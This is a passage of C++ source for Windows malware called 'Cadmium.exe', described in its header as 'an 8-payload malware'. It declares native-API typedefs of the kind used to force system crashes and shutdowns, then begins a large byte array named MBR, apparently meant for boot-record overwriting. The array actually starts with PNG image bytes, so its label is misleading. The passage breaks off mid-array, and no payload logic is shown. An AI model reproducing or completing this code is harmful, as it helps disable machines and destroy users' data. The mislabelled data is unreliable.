// Cadmium.exe
//
// an 8-payload malware made by UltraDasher965 & TELEPATHII
#include <windows.h>
#include <windowsx.h>
#include <math.h>
#include <thread>
#include <iostream>
#include <tlhelp32.h>
#include <tchar.h>
#include <cmath>
#include <ctime>
#include <mmsystem.h>
#include <time.h>
#define pi   3.14159265358979323846264338327950288
#define IDI_ICON1
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef ULONG32(NTAPI* lpNtShutdownSystem)(int Action);
typedef ULONG32(NTAPI* lpNtSetSystemPowerState)(IN POWER_ACTION SystemAction, IN SYSTEM_POWER_STATE MinSystemState, IN ULONG32 Flags);

const unsigned char MBR[]{
    0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
0x00, 0x00, 0x01, 0x40, 0x00, 0x00, 0x00, 0xC8, 0x08, 0x02, 0x00, 0x00, 0x00, 0x16, 0x66, 0xAF,
0xFC, 0x00, 0x00, 0x36, 0x81, 0x49, 0x44, 0x41, 0x54, 0x78, 0x9C, 0xED, 0x5D, 0x6D, 0x7A, 0xE3,
0xAC, 0x0E, 0x65, 0xFA, 0xCC, 0xBE, 0xEA, 0x9D, 0xF5, 0xCC, 0xCE, 0xDC, 0x9D, 0xDD, 0x1F, 0x18,
0x59, 0x48, 0x42, 0x08, 0x8C, 0x13, 0xB7, 0xEF, 0x3D, 0xCF, 0x4C, 0xEA, 0x60, 0x90, 0x30, 0x70,
0xD0, 0x87, 0x9D, 0xE4, 0xCF, 0xBE, 0xEF, 0xC9, 0xC2, 0xE7, 0xE7, 0xA7, 0x59, 0xDE, 0xC5, 0xF7,
0xF7, 0xB7, 0x16, 0x95, 0x0B, 0xE9, 0x60, 0x08, 0xBA, 0xD5, 0xE7, 0xE7, 0xE7, 0xBF, 0x7F, 0xFF,
0x58, 0x01, 0x12, 0xF2, 0x9F, 0x16, 0x00, 0xC8, 0x82, 0x24, 0x8B, 0x42, 0x50, 0x82, 0xEC, 0x3A,
0xA2, 0x5A, 0xA4, 0xD5, 0x44, 0x4F, 0x90, 0xD2, 0x79, 0x15, 0x40, 0x42, 0x4A, 0xA8, 0x4B, 0x78,
0x05, 0xD6, 0xD4, 0x1B, 0xAA, 0x22, 0xBC, 0x34, 0xED, 0xD4, 0xD4, 0xD8, 0xB6, 0x6D, 0xB4, 0x09,
0x47, 0x5E, 0x78, 0xCE, 0x3A, 0xC9, 0x2B, 0x96, 0x6B, 0xA1, 0x35, 0x7C, 0xC7, 0x38, 0x73, 0xB1,
0xFA, 0xD2, 0x5A, 0xF4, 0x31, 0xD1, 0x1D, 0x99, 0x2C, 0xAD, 0x0C, 0x3E, 0x22, 0x32, 0xFF, 0xBC,
0x80, 0xC0, 0x24, 0x70, 0x82, 0xBD, 0xA2, 0x21, 0xF5, 0xEA, 0xFB, 0xFB, 0xBB, 0xEE, 0x39, 0x0A,
0x8B, 0x0D, 0xD0, 0x58, 0x94, 0x45, 0x9F, 0x26, 0xD6, 0xA5, 0x10, 0xE5, 0x9F, 0x3A, 0x35, 0x26,
0x93, 0x42, 0x57, 0x51, 0xCF, 0x31, 0x8C, 0xCB, 0x41, 0x4A, 0xE9, 0xD2, 0x26, 0x35, 0x4D, 0x86,
0x2B, 0x04, 0xE6, 0xF3, 0xDB, 0xAA, 0xA3, 0x09, 0x9C, 0xEE, 0xE7, 0xF0, 0x45, 0xC9, 0x91, 0x31,
0xE1, 0xEB, 0xB9, 0x35, 0x05, 0x7C, 0x25, 0xE7, 0x83, 0xBF, 0xF9, 0x8F, 0x60, 0xD7, 0x34, 0x7B,
0x83, 0x18, 0x25, 0xB3, 0xA8, 0x6F, 0xB5, 0x45, 0x4D, 0xA0, 0x93, 0x36, 0x00, 0xF8, 0x4A, 0x1F,
0x43, 0xDD, 0xAC, 0x35, 0x85, 0x9E, 0xBD, 0xBD, 0x9B, 0xBD, 0xDC, 0x95, 0xA8, 0xDC, 0x8A, 0x39,
0xBD, 0x24, 0x75, 0xAE, 0x79, 0x4A, 0x29, 0xED, 0xFB, 0x7E, 0xD1, 0x08, 0x77, 0xA1, 0xE5, 0x6F,
0xDB, 0x36, 0x61, 0xBE, 0x62, 0xC8, 0x02, 0xCB, 0x1B, 0x75, 0xE0, 0x60, 0x96, 0xB7, 0xF4, 0x0F,
0xA9, 0x71, 0x45, 0x54, 0x78, 0x58, 0xE0, 0x85, 0x8C, 0xED, 0x5A, 0xE0, 0x09, 0xF6, 0x0A, 0xB1,
0x6D, 0xBF, 0x05, 0xEA, 0xA0, 0x3E, 0x2B, 0x8A, 0x2B, 0x5E, 0xD7, 0xE7, 0x90, 0x92, 0x60, 0x83,
0x72, 0x8C, 0x93, 0x4F, 0xDD, 0x1B, 0xAC, 0x81, 0xDC, 0x80, 0xC1, 0xAF, 0x18, 0xF0, 0xFD, 0x90,
0x98, 0xF0, 0x39, 0xB7, 0xD9, 0x47, 0x9C, 0xCF, 0x41, 0x0B, 0x6C, 0x0A, 0xD4, 0xAB, 0x62, 0xC5,
0xF8, 0xA3, 0xFA, 0x8B, 0xC4, 0x07, 0xC7, 0x91, 0x3F, 0x4A, 0x5D, 0x2E, 0xF0, 0x54, 0x55, 0x0E,
0x9A, 0x6A, 0xC8, 0x02, 0xBF, 0x00, 0x73, 0xFE, 0x73, 0x6E, 0x98, 0xE7, 0xB5, 0x17, 0x6F, 0xA0,
0x3A, 0x86, 0x76, 0x95, 0x1B, 0x8B, 0x1B, 0x6A, 0x84, 0x90, 0xC4, 0x0E, 0x8B, 0x06, 0x39, 0xC5,
0xC6, 0xAF, 0x2B, 0x78, 0x5A, 0x5A, 0x40, 0xA9, 0x5D, 0xF5, 0x00, 0x46, 0xBF, 0x40, 0x27, 0x21,
0x4A, 0xA8, 0x49, 0xD7, 0x52, 0x98, 0x9E, 0xFF, 0x5B, 0x10, 0xB4, 0x22, 0x2D, 0x6E, 0xD0, 0x5C,
0x10, 0x60, 0xED, 0xB9, 0x93, 0x08, 0xCB, 0x09, 0x06, 0xBA, 0x2D, 0x35, 0xA7, 0x55, 0x51, 0xDE,
0xB2, 0x89, 0x3F, 0x00, 0xBE, 0xBE, 0xBE, 0x82, 0x9D, 0x8B, 0xC0, 0x27, 0xEA, 0x5C, 0x24, 0x1C,
0x4B, 0x15, 0x20, 0x5E, 0x81, 0x46, 0x79, 0xDF, 0xF7, 0x04, 0xA2, 0x0A, 0x22, 0x26, 0x4C, 0x50,
0x57, 0x37, 0x41, 0x92, 0x9E, 0x16, 0xEC, 0x53, 0x2B, 0x4C, 0x5D, 0x3D, 0xBD, 0x60, 0xA4, 0x85,
0x57, 0xD1, 0x2E, 0xBC, 0xC3, 0xFC, 0xA6, 0xD5, 0x16, 0x38, 0xB9, 0x5E, 0x7A, 0x6B, 0xA9, 0x4C,
0x31, 0x19, 0xAD, 0xD1, 0xE8, 0x4A, 0x0B, 0xFA, 0x08, 0x52, 0x5B, 0x3A, 0x15, 0xE6, 0x05, 0xD6,
0x55, 0xF4, 0x67, 0xDF, 0xF7, 0xB5, 0x11, 0xEF, 0xB4, 0xA5, 0x35, 0x31, 0x94, 0xE5, 0xAB, 0x81,
0x70, 0x21, 0x3F, 0xEF, 0x0D, 0x98, 0xA6, 0xAE, 0xDE, 0x99, 0x99, 0x31, 0x64, 0x5B, 0x29, 0x1D,
0x8B, 0x69, 0x9A, 0xB6, 0x0F, 0x0D, 0xAA, 0x51, 0x68, 0x04, 0x76, 0xD6, 0xEA, 0x66, 0xDD, 0xD5,
0x91, 0x53, 0xD3, 0x88, 0xD0, 0xB8, 0x9B, 0x82, 0xEE, 0xC2, 0x5F, 0x30, 0xD7, 0xAF, 0x6B, 0x48,
0x42, 0xBE, 0xE4, 0xB9, 0x4C, 0x75, 0x84, 0xBD, 0xE9, 0xE1, 0x04, 0x5E, 0xCB, 0xDE, 0xB6, 0x71,
0xB2, 0xDA, 0xBB, 0x0E, 0xB3, 0x5F, 0x4D, 0x94, 0x13, 0xA9, 0x74, 0x17, 0x51, 0xE8, 0x1D, 0x62,
0x72, 0xCF, 0x3B, 0xC8, 0x6A, 0x6C, 0x5D, 0x81, 0x12, 0x43, 0xE0, 0x3D, 0x1E, 0xB5, 0xC3, 0xE4,
0xEB, 0x04, 0x4E, 0x81, 0x65, 0x33, 0x77, 0x5D, 0xB7, 0xC6, 0x17, 0x3A, 0xA9, 0x1E, 0x54, 0xF7,
0x77, 0x39, 0x81, 0x57, 0xE1, 0x02, 0x7B, 0x4D, 0x54, 0xA6, 0xB1, 0x4B, 0xE3, 0xE2, 0x8B, 0xA6,
0x84, 0x73, 0x1F, 0x3D, 0xBB, 0x04, 0xF6, 0x9A, 0xCE, 0xB2, 0x10, 0x2B, 0x52, 0x45, 0x33, 0xED,
0xF4, 0x0A, 0xD9, 0x8E, 0x44, 0x88, 0xB3, 0x8E, 0xF6, 0x7A, 0x8F, 0x08, 0x2E, 0x8E, 0x73, 0x98,
0xEE, 0x8F, 0x8D, 0x5B, 0x5E, 0xF1, 0xF4, 0xDD, 0x47, 0x07, 0x91, 0x05, 0xA0, 0x9B, 0xAC, 0xED,
0x03, 0xC7, 0x34, 0x7B, 0x53, 0x8E, 0x81, 0xB7, 0x6D, 0x7B, 0x41, 0x16, 0x7A, 0x14, 0x97, 0x09,
0x0C, 0xF1, 0x36, 0x5F, 0xE6, 0x79, 0x03, 0xB9, 0x67, 0xF7, 0xAA, 0x38, 0x59, 0xCB, 0x46, 0x96,
0x61, 0x4B, 0x40, 0x62, 0xCB, 0xA4, 0x7A, 0x3D, 0x4F, 0x76, 0xBA, 0x1F, 0x00, 0x91, 0x1F, 0xAC,
0xC4, 0x8C, 0x9D, 0x48, 0xF7, 0x15, 0xD5, 0x0B, 0x17, 0xB1, 0xF9, 0x18, 0xC6, 0xC2, 0x9B, 0x4F,
0xC1, 0xC5, 0x13, 0xA1, 0xF1, 0xCB, 0xDC, 0x90, 0xBC, 0x85, 0x0D, 0xB1, 0x37, 0xA5, 0xF4, 0xB1,
0xB0, 0x4F, 0x0B, 0xB1, 0xC2, 0xFC, 0x42, 0x98, 0xA8, 0x7D, 0xDF, 0xF3, 0xF3, 0x5B, 0xDB, 0xB6,
0x6D, 0xDB, 0x16, 0x61, 0x6F, 0x65, 0x75, 0x63, 0xFA, 0xE8, 0x38, 0x51, 0x2C, 0x5A, 0x2D, 0x13,
0xA4, 0x2B, 0x14, 0x62, 0x4A, 0xCA, 0x9F, 0x4A, 0x14, 0x80, 0xFB, 0x82, 0x40, 0x94, 0x2D, 0xE9,
0x3A, 0x76, 0x86, 0x25, 0x02, 0xE7, 0xC0, 0xB2, 0x13, 0xDE, 0x69, 0x0C, 0x19, 0xEB, 0x18, 0xC4,
0x85, 0x67, 0xDE, 0x8E, 0xB2, 0x37, 0xBD, 0xE6, 0x36, 0xD2, 0x1D, 0x5E, 0xD0, 0x20, 0x40, 0x8B,
0xCF, 0x32, 0xA7, 0xD2, 0x14, 0xEB, 0x58, 0x97, 0x55, 0x6E, 0x4E, 0x26, 0x28, 0xA0, 0xE5, 0x62,
0x0F, 0xBD, 0x74, 0x70, 0xCD, 0x1D, 0xCD, 0x41, 0x30, 0xF1, 0xB8, 0x25, 0x8A, 0x99, 0x7B, 0x5D,
0x7C, 0x11, 0xF7, 0xF9, 0xD5, 0x17, 0x9F, 0x00, 0xE1, 0xCD, 0xBD, 0x19, 0x54, 0xA8, 0x62, 0x99,
0xAA, 0x44, 0xD4, 0x9B, 0xEE, 0x9A, 0x0D, 0x7A, 0xA4, 0x6C, 0xDF, 0x77, 0xDF, 0xA1, 0x73, 0xF0,
0x27, 0xB7, 0x19, 0xBA, 0x93, 0x44, 0x37, 0x66, 0xE9, 0x58, 0x94, 0x50, 0xCD, 0xE0, 0x5D, 0x01,
0x0D, 0xED, 0x56, 0x5D, 0xDF, 0xAA, 0xDD, 0xC8, 0x07, 0xF4, 0xDA, 0x9A, 0x7B, 0x1A, 0x5C, 0x1C,
0x04, 0x2A, 0xFC, 0xAC, 0xA5, 0x08, 0xE9, 0x5A, 0x99, 0xA9, 0x3E, 0x02, 0x24, 0xC3, 0xDE, 0x36,
0x2B, 0xDF, 0xC3, 0xDE, 0x88, 0xA2, 0x8B, 0x10, 0xDE, 0x75, 0xEB, 0xF1, 0xE3, 0xD6, 0xA3, 0x94,
0xD3, 0x0B, 0x86, 0x79, 0x4B, 0xF6, 0xD6, 0x74, 0x6B, 0x1E, 0x60, 0x7A, 0x18, 0x0F, 0x02, 0xCF,
0x85, 0xC1, 0x9A, 0xAB, 0xA2, 0x84, 0x88, 0x3D, 0x4A, 0xE0, 0x56, 0x67, 0xEA, 0xCF, 0x30, 0x0C,
0x43, 0xEF, 0xB5, 0x54, 0x7E, 0xD2, 0xD3, 0x6D, 0x1B, 0x39, 0xB6, 0x5C, 0x4D, 0x00, 0x4C, 0x34,
0x0C, 0x45, 0xB4, 0xBB, 0x98, 0x3D, 0x68, 0x4D, 0x70, 0x90, 0xC3, 0x37, 0xB1, 0x97, 0xC9, 0x4F,
0x37, 0xB8, 0x99, 0x27, 0x34, 0x2D, 0xE3, 0x44, 0xED, 0x7B, 0xFE, 0xCA, 0x05, 0x2B, 0xF5, 0x0F,
0xFF, 0x59, 0xD4, 0x5D, 0x8E, 0x2B, 0xB3, 0xF3, 0x87, 0x1A, 0x4F, 0x3F, 0xCE, 0x61, 0x92, 0x93,
0x33, 0x30, 0xC2, 0xDE, 0xEE, 0xF6, 0x51, 0x92, 0x4F, 0x8C, 0x07, 0x48, 0x83, 0x8B, 0x06, 0x25,
0x2C, 0x35, 0x87, 0x0C, 0xEA, 0x40, 0x9E, 0xAC, 0x38, 0x48, 0x8C, 0x97, 0x73, 0xDF, 0x16, 0xE2,
0x77, 0x6E, 0x8A, 0xC0, 0x91, 0x53, 0x77, 0xB3, 0xF7, 0x54, 0x97, 0x6E, 0xB6, 0x53, 0x35, 0xE2,
0x77, 0x59, 0xBD, 0x71, 0x40, 0x3B, 0x26, 0x22, 0x1A, 0x4B, 0x82, 0xE7, 0xD2, 0x7E, 0x0F, 0x23,
0xBD, 0xBA, 0x88, 0x93, 0xC0, 0x57, 0x72, 0xD1, 0x3E, 0x87, 0xBB, 0xCF, 0x66, 0x45, 0xE4, 0x1F,
0xEC, 0x4D, 0xFC, 0x25, 0xA5, 0xE1, 0xBD, 0x1F, 0x47, 0x38, 0xAA, 0x4F, 0x40, 0x54, 0xA3, 0xF2,
0x7A, 0xFF, 0xC6, 0x49, 0x63, 0xB1, 0x2C, 0x50, 0x76, 0x08, 0xBD, 0xA3, 0xF7, 0xBB, 0xE4, 0x59,
0x6F, 0x7F, 0xA6, 0x41, 0x8E, 0x7C, 0x6E, 0x19, 0x57, 0x7C, 0x1F, 0x5E, 0xB6, 0x65, 0x0C, 0x61,
0x7A, 0x3B, 0xF3, 0x99, 0x9C, 0xC6, 0xC9, 0xBC, 0x70, 0x7C, 0xC6, 0x92, 0x58, 0xFC, 0x63, 0x7D,
0x71, 0xAF, 0xF8, 0x62, 0x12, 0x8B, 0xB1, 0x17, 0xB4, 0x3E, 0xE9, 0x08, 0x99, 0x51, 0xD1, 0x11,
0x41, 0x21, 0x30, 0xEA, 0xA5, 0xDE, 0x68, 0x3E, 0x32, 0xE5, 0xC1, 0x1E, 0x74, 0xDA, 0x8D, 0x93,
0x10, 0xC5, 0xAD, 0xE0, 0xE2, 0x66, 0x3B, 0xB3, 0x06, 0x2F, 0xB6, 0xFC, 0x41, 0x1C, 0x5B, 0xDD,
0x78, 0xDF, 0x4A, 0x93, 0xE6, 0xE4, 0xC4, 0x77, 0xEC, 0xE5, 0x63, 0xF2, 0x87, 0x4B, 0x8C, 0x18,
0xE1, 0x57, 0xE6, 0x93, 0xAB, 0xDB, 0xB6, 0x29, 0x09, 0xE3, 0x8B, 0xBA, 0xF2, 0x8C, 0x29, 0xAE,
0xDE, 0x8A, 0x32, 0x3A, 0xF2, 0xC6, 0x5C, 0x1B, 0x4C, 0x90, 0x1D, 0x1E, 0x45, 0xBB, 0x4D, 0x47,
0x1A, 0x73, 0x0A, 0xD2, 0x33, 0x08, 0xCC, 0x31, 0x38, 0x2F, 0xF7, 0x23, 0xB3, 0x70, 0x96, 0x48,
0x48, 0x64, 0x70, 0x87, 0x0D, 0xF2, 0x1D, 0x3B, 0xDA, 0x30, 0x81, 0x5B, 0x58, 0x4E, 0x6C, 0xBA,
0xAF, 0x5D, 0x13, 0x0B, 0x67, 0x0D, 0xC8, 0x75, 0x81, 0x34, 0xEA, 0xCD, 0xE0, 0x78, 0x41, 0x2D,
0x1B, 0xA9, 0x56, 0xEA, 0x4D, 0xC9, 0xA0, 0xC7, 0xEB, 0x75, 0xC6, 0xF4, 0xBE, 0xFB, 0xD2, 0x9E,
0x66, 0xE9, 0x2C, 0x20, 0x8D, 0x3B, 0x9A, 0xB7, 0x00, 0xA7, 0x13, 0x67, 0xCD, 0xDD, 0x98, 0xAC,
0xB6, 0xB7, 0x94, 0x05, 0x83, 0x14, 0xDE, 0x76, 0xED, 0x1F, 0xFC, 0xCD, 0x28, 0x7B, 0xBF, 0x19,
0x96, 0xF6, 0xEA, 0x40, 0xB1, 0xBD, 0xB0, 0x4F, 0xE7, 0xE5, 0x5E, 0x15, 0x4C, 0x2C, 0x66, 0xB5,
0x0D, 0x9C, 0xC2, 0xD8, 0x9B, 0x96, 0xD4, 0x95, 0x13, 0x03, 0x92, 0x88, 0xB2, 0xBC, 0x10, 0x50,
0xE1, 0x9F, 0x46, 0xA0, 0xCE, 0x0B, 0x80, 0x15, 0x84, 0x59, 0xD4, 0x91, 0x72, 0x94, 0x47, 0xFA,
0x42, 0x97, 0x68, 0x86, 0x52, 0x6B, 0x96, 0x70, 0xD4, 0x9B, 0x56, 0xD1, 0xC5, 0xFC, 0x83, 0x1C,
0x2F, 0x7F, 0x36, 0x03, 0x76, 0x19, 0x8E, 0x7D, 0x8E, 0x4E, 0x0F, 0x2E, 0x94, 0x86, 0x58, 0xF6,
0xD7, 0x91, 0x15, 0x57, 0x13, 0xC5, 0xB1, 0x75, 0x9F, 0xAF, 0xB8, 0xAC, 0x05, 0xE9, 0x41, 0x51,
0xE9, 0x63, 0x3A, 0x92, 0x41, 0xEB, 0x06, 0xD3, 0xC3, 0xCC, 0xAE, 0x88, 0x24, 0x20, 0xB0, 0x76,
0xD6, 0xE0, 0xA3, 0x5F, 0xA5, 0x8D, 0xFB, 0x3E, 0x05, 0xA1, 0xEE, 0x0D, 0xE0, 0xFC, 0x8B, 0x73,
0x70, 0x90, 0xEA, 0x63, 0xAA, 0x5D, 0xC7, 0x05, 0xA1, 0xE7, 0x7B, 0xE0, 0x9D, 0x69, 0x9F, 0x34,
0x1B, 0x8C, 0x55, 0x37, 0xF4, 0x49, 0x79, 0xC3, 0x02, 0x51, 0x59, 0x87, 0xAA, 0x74, 0xB6, 0x5B,
0x2B, 0xF1, 0x90, 0x6E, 0x30, 0x20, 0xB9, 0x2E, 0x71, 0xBF, 0x3D, 0xC8, 0x6B, 0x06, 0x95, 0x5C,
0xED, 0x54, 0x00, 0x7F, 0x68, 0x96, 0xD3, 0x48, 0x0C, 0x4C, 0x0F, 0x60, 0xDD, 0xD4, 0xAD, 0xF3,
0xA6, 0x11, 0x47, 0xA3, 0x00, 0xFC, 0x7D, 0x6D, 0x8A, 0x53, 0xB9, 0x28, 0xF5, 0x25, 0x78, 0x96,
0x5C, 0x98, 0xA5, 0x55, 0x89, 0x2E, 0xB4, 0x25, 0x4E, 0x4D, 0x1E, 0xD1, 0xCB, 0x6C, 0x0C, 0xCB,
0xDB, 0x77, 0x14, 0xB1, 0x15, 0x05, 0x25, 0xF2, 0x29, 0x0C, 0x7A, 0x4A, 0x3F, 0x18, 0xD6, 0xF8,
0x08, 0xE6, 0x6C, 0xDD, 0x80, 0x19, 0x02, 0xBF, 0xC0, 0x79, 0xAE, 0x08, 0x8C, 0xEA, 0x14, 0x6A,
0x4F, 0x25, 0x89, 0xE3, 0x72, 0x3A, 0xBF, 0x8D, 0x71, 0xD8, 0x50, 0x04, 0x5D, 0x4B, 0x69, 0x6F,
0x81, 0x56, 0x00, 0x1F, 0xDB, 0x3A, 0x5E, 0x87, 0x96, 0x14, 0x5C, 0x31, 0xBC, 0x5A, 0xB7, 0x49,
0xEE, 0x47, 0x4C, 0xD8, 0xDB, 0xF0, 0x88, 0x4E, 0x28, 0x2C, 0x4A, 0x71, 0xDD, 0x8E, 0x99, 0x2C,
0xF4, 0x1D, 0x04, 0xE6, 0x0F, 0xB8, 0x3A, 0xEC, 0xB5, 0x0A, 0xAC, 0x53, 0xA8, 0xFC, 0xC6, 0xD4,
0x79, 0x6A, 0xC7, 0xD0, 0xE5, 0x6B, 0x71, 0xCE, 0xA6, 0x3C, 0x73, 0x6C, 0x58, 0xA1, 0x5E, 0x1D,
0xC9, 0xE6, 0x5B, 0xBF, 0x55, 0x47, 0x60, 0x97, 0xE4, 0x8F, 0xE1, 0xCF, 0x73, 0x7A, 0x92, 0x91,
0x8D, 0xE8, 0x5C, 0xFC, 0xB2, 0xBE, 0x37, 0x0D, 0x54, 0x16, 0x38, 0xC5, 0x1E, 0xA8, 0x7C, 0xC9,
0x77, 0x6E, 0x40, 0xFC, 0x4D, 0xE1, 0x75, 0x0C, 0xFE, 0xE7, 0x78, 0xF5, 0x9B, 0x4A, 0x67, 0x27,
0xA8, 0xC8, 0x96, 0x75, 0x38, 0xAE, 0xC0, 0xF8, 0x44, 0x82, 0x05, 0x61, 0x4E, 0x4B, 0xA8, 0xD7,
0x4E, 0x67, 0x42, 0x9A, 0x63, 0x15, 0x6F, 0x06, 0x52, 0x7F, 0xC7, 0x79, 0x3D, 0x86, 0xAC, 0xF1,
0x8B, 0x87, 0xF2, 0x43, 0xBC, 0xEF, 0x92, 0xF3, 0x75, 0xC9, 0x67, 0x54, 0x2C, 0x46, 0xB3, 0x5E,
0xA3, 0x1D, 0x98, 0x3B, 0xDD, 0x1D, 0xD3, 0x21, 0x05, 0xC1, 0x6E, 0xCC, 0x4E, 0x24, 0x62, 0x7D,
0x09, 0x56, 0x8B, 0xF1, 0xE1, 0xBA, 0xC3, 0xB8, 0x06, 0x78, 0xCE, 0x5E, 0xC2, 0x70, 0xB8, 0x54,
0x81, 0x8E, 0xBD, 0xBE, 0xF3, 0xA1, 0xDB, 0x48, 0x57, 0x7E, 0x18, 0xE5, 0x3A, 0xD0, 0x2A, 0x97,
0x83, 0x55, 0x15, 0xE0, 0x28, 0x3A, 0xCF, 0x79, 0x83, 0xDB, 0x3E, 0xF3, 0x5F, 0x82, 0xF0, 0xFD,
0xDF, 0xDA, 0x8F, 0xA7, 0x31, 0x99, 0xF5, 0xA9, 0xD5, 0xB1, 0xB7, 0x74, 0xF8, 0xA3, 0xBB, 0x76,
0x73, 0xC2, 0xF9, 0x26, 0xF6, 0x36, 0x6F, 0xF0, 0xA0, 0xD3, 0xD0, 0x1A, 0x2C, 0x68, 0x96, 0x82,
0x0B, 0xB3, 0xC7, 0x17, 0x11, 0x75, 0x63, 0x00, 0xE6, 0xFC, 0xC0, 0x60, 0x9B, 0x21, 0xD1, 0x48,
0x63, 0x4E, 0xE9, 0x53, 0x6C, 0x71, 0x21, 0xCB, 0xBB, 0x7B, 0x51, 0xE3, 0x18, 0x1C, 0x35, 0x44,
0xEF, 0x1B, 0x34, 0xE9, 0x42, 0x8B, 0xA0, 0x74, 0xFA, 0x03, 0xBD, 0xAB, 0x00, 0xB3, 0xD0, 0x9D,
0x5A, 0xCD, 0x61, 0xFA, 0x77, 0x77, 0x7C, 0x85, 0xD2, 0x83, 0x5B, 0x55, 0x0C, 0x48, 0x9F, 0x76,
0xE3, 0x9F, 0xC1, 0xE2, 0xE2, 0x11, 0xE0, 0xDD, 0x1D, 0x11, 0x00, 0x70, 0xE6, 0xB7, 0xDE, 0x3B,
0x54, 0x99, 0xC0, 0x55, 0x07, 0x88, 0xAB, 0xFA, 0xE0, 0x09, 0x08, 0x86, 0x22, 0x4D, 0x53, 0xFC,
0x84, 0x85, 0x39, 0x0E, 0xB0, 0xD7, 0x99, 0xE6, 0x33, 0x57, 0x6D, 0x78, 0x34, 0x6F, 0xC1, 0x43,
0x1C, 0x7B, 0x09, 0x3C, 0xC2, 0x5B, 0x91, 0x16, 0x38, 0x15, 0x23, 0xFC, 0x9A, 0xB8, 0xF7, 0xF3,
0xF3, 0xD3, 0xF6, 0xA2, 0x65, 0x62, 0xD8, 0xAA, 0xD1, 0x83, 0x39, 0xB8, 0xAA, 0xA8, 0x2F, 0x27,
0x8E, 0x95, 0xB2, 0xD8, 0x4E, 0x83, 0x6B, 0xC2, 0x8F, 0xE6, 0xD3, 0x8E, 0xFD, 0xFB, 0x57, 0x69,
0x4A, 0xEF, 0xF0, 0xED, 0xBB, 0x0F, 0xF0, 0x3D, 0x61, 0x5C, 0x0C, 0x02, 0xA7, 0x77, 0x67, 0xAD,
0x1C, 0x8C, 0xA6, 0x37, 0x6C, 0x0E, 0xDF, 0x36, 0xEE, 0x2B, 0xE4, 0x92, 0x8C, 0xA3, 0x97, 0x57,
0x64, 0x42, 0xBD, 0x9D, 0xF5, 0x48, 0x9F, 0x60, 0x6C, 0x52, 0x7A, 0x4E, 0x3F, 0x9E, 0xC1, 0xDE,
0xC4, 0x08, 0x0C, 0x5E, 0x7A, 0x5F, 0xD6, 0x4A, 0x80, 0x7F, 0x1B, 0x5E, 0x05, 0x78, 0xC1, 0xDE,
0xD0, 0xD8, 0xBD, 0x86, 0xC3, 0x28, 0x72, 0xAF, 0x49, 0x39, 0x9B, 0x63, 0x34, 0xDC, 0x1D, 0x52,
0x32, 0xD9, 0xCF, 0xA7, 0xD0, 0xE7, 0x05, 0xFD, 0xF0, 0xCD, 0xEF, 0x23, 0x46, 0x21, 0xA5, 0xE4,
0x58, 0xE0, 0x57, 0xDA, 0x5E, 0x63, 0xB0, 0xFA, 0x2E, 0xF4, 0x00, 0x1A, 0xC3, 0xBD, 0x50, 0xC3,
0x22, 0x59, 0xC5, 0xCD, 0x5D, 0x23, 0x8D, 0xC9, 0xD5, 0xEF, 0x2F, 0x24, 0x87, 0x1E, 0x41, 0xE3,
0x5B, 0x93, 0x5B, 0xFC, 0xEB, 0x69, 0xB5, 0xDE, 0xF7, 0x5F, 0x3C, 0xC3, 0x47, 0x4A, 0xA7, 0xF9,
0xA0, 0x52, 0xFD, 0xA5, 0xDB, 0x4B, 0xBE, 0x80, 0x7B, 0xE4, 0xD3, 0x4B, 0x48, 0x6A, 0x7E, 0x60,
0x1E, 0x06, 0xC5, 0xA9, 0x41, 0xBF, 0x65, 0x16, 0x46, 0x85, 0xA2, 0xA4, 0x68, 0xEE, 0x4C, 0xD4,
0xB4, 0xE4, 0x52, 0x8E, 0xF7, 0x42, 0x8A, 0x6B, 0xBE, 0x57, 0x57, 0x50, 0x14, 0xDF, 0xA2, 0xDE,
0xB1, 0xBD, 0x8F, 0xA2, 0x6E, 0xC6, 0x5F, 0x10, 0x57, 0x60, 0x9C, 0x5E, 0xF8, 0xB3, 0x17, 0xF1,
0x6F, 0x8A, 0x6D, 0x7E, 0x2B, 0xB7, 0x4C, 0xEB, 0x8C, 0xC1, 0x58, 0x71, 0xB3, 0x79, 0x1D, 0x5F,
0x8D, 0x5D, 0x62, 0x65, 0xC5, 0xFD, 0x92, 0x55, 0xF0, 0x2F, 0xF1, 0xDA, 0x00, 0x94, 0x1D, 0xE0,
0x8A, 0x8C, 0x19, 0x95, 0xB7, 0x43, 0x7F, 0x25, 0xF5, 0x03, 0xD9, 0x9B, 0xB2, 0x05, 0x86, 0x75,
0xA2, 0xF5, 0xC5, 0xD9, 0x73, 0x70, 0x6C, 0xAF, 0xF8, 0xBC, 0x6E, 0x7F, 0xA7, 0xB8, 0x30, 0x8E,
0x30, 0xDE, 0xCE, 0x4B, 0x33, 0xE5, 0x1B, 0xFF, 0xCA, 0xC6, 0xC1, 0x0B, 0x9F, 0x86, 0x4B, 0x1E,
0xE9, 0xAB, 0x6C, 0xF1, 0x9D, 0x6E, 0xCA, 0x09, 0x5A, 0xEA, 0xFC, 0x03, 0x36, 0xCF, 0x64, 0x6F,
0x72, 0x08, 0x9C, 0x0A, 0xB5, 0xF8, 0x37, 0x68, 0x07, 0x69, 0x2C, 0x6A, 0x3A, 0xEC, 0xA5, 0x53,
0x59, 0x4B, 0xEC, 0x93, 0xF7, 0x30, 0xBB, 0x1A, 0xE9, 0x98, 0x6E, 0xFB, 0x82, 0x79, 0x39, 0x1C,
0xE4, 0xA7, 0x52, 0x97, 0x40, 0x1E, 0xF5, 0x6C, 0xF3, 0x7B, 0x79, 0x5C, 0xF6, 0xC0, 0x57, 0xE0,
0xBD, 0xBF, 0xD8, 0x34, 0x84, 0x0F, 0x54, 0x6F, 0xCF, 0x77, 0xFC, 0x1A, 0x34, 0x8D, 0x45, 0x78,
0x2C, 0x4A, 0xA8, 0x7E, 0xCE, 0x66, 0x53, 0xB9, 0x48, 0x8C, 0xBD, 0xE5, 0x36, 0x95, 0xB1, 0xC6,
0x54, 0xC1, 0xBC, 0xF0, 0x66, 0xF1, 0xA9, 0x76, 0x9D, 0xB6, 0x5B, 0x70, 0x21, 0x47, 0x7D, 0xB4,
0xBF, 0x83, 0xC5, 0xB7, 0xA6, 0xAC, 0x4C, 0xC4, 0xBF, 0x35, 0xFE, 0xBD, 0xF8, 0x93, 0x64, 0x0E,
